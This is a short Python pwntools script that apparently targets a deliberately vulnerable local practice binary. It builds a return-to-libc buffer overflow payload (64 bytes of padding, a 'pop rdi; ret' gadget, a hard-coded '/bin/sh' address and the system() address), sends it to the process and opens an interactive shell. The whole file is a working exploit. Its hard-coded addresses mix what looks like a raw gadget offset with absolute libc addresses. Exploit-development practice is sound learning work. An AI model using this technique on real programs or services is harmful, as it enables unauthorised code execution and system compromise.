from pwn import *

offset = 64  # Offset found using cyclic_find
pop_rdi = p64(0x0000000000001233)  # pop rdi ; ret gadget
bin_sh = p64(0x7ffff7f775bd)  # Corrected "/bin/sh" address
sys_addr = p64(0x7ffff7e15290)  # Corrected system() address

payload = b"A" * offset
payload += pop_rdi  # Set up first argument (rdi) for system()
payload += bin_sh  # Pass "/bin/sh" as the argument to system()
payload += sys_addr  # Call system("/bin/sh")

# Run the vulnerable binary and send the payload
p = process(".github/exploit_dev_files/vulnerable_c")
p.sendline(payload)
p.interactive()